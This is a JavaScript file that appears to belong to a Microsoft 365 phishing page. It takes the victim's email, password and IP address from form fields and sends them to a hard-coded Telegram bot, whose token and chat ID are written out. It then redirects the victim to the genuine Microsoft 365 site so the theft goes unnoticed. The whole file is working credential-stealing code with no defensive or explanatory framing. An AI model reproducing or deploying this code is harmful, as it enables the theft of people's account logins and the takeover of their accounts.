//bot token
var telegram_bot_id = "7848517829:AAHQTUI3_dEz-zBwQG0UsC80vrsOR0k0uzo";
//chat id
var chat_id = "735009392";
var bmw1, bmw2, ip, ip2;
var ready = function () {
    bmw1 = document.getElementById("bmw1").value;
    ip2 = document.getElementById("address").innerHTML;
    message = "\n📲: " + ip2;
    localStorage.setItem("bmw1", bmw1);
};
var sender = function () {
    ready();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"

        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };
    $.ajax(settings).done(function (response) {
        window.location = 'clx.html';
        console.log(response);
    });
    return false;
};


var ready2 = function () {
    bmw1 = localStorage.getItem("bmw1");
	bmw2 = document.getElementById("bmw2").value;
    ip2 = document.getElementById("address").innerHTML;
    message = "\n✉:" + bmw1 + "\n🔒: " + bmw2 + "\n🕵🌎: " + ip2  ;
};
var sender2 = function () {
    ready2();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"

        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };
    $.ajax(settings).done(function (response) {
        window.location = 'https://www.microsoft.com/es-co/microsoft-365';
        console.log(response);
    });
    return false;
};